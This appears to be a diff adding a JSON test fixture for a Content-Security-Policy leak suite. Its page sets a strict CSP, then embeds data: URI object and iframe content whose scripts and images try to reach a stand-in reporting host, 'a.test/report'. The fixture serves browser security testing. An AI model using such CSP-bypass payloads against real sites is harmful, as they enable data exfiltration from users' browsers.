@@ -1,0 +1,12 @@
+```json
+{
+  "f1441468": {
+    "url_queue.txt": "https://leak.test/CSP/f1441468/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<html>\n<head>\n  <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'none'; object-src data:; img-src 'none'; frame-src data:\"/>\n</head>\n<body>\n  <object data=\"data:text/html;,<svg version='1.1' width='660' height='342' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><script>document.location.href='https://a.test/report/?leak=f1441468'</script><image xlink:href='https://a.test/report/?leak=f1441468/image' width='660' height='342'/></svg>\" ></object>\n  <iframe src=\"data:text/html;,<script>document.location.href='https://a.test/report/?leak=f1441468'</script><img src='https://a.test/report/?leak=f1441468/image' width='660' height='342'/>\"></iframe>\n</body>\n</html>"
+      }
+    }
+  }
+}
+```
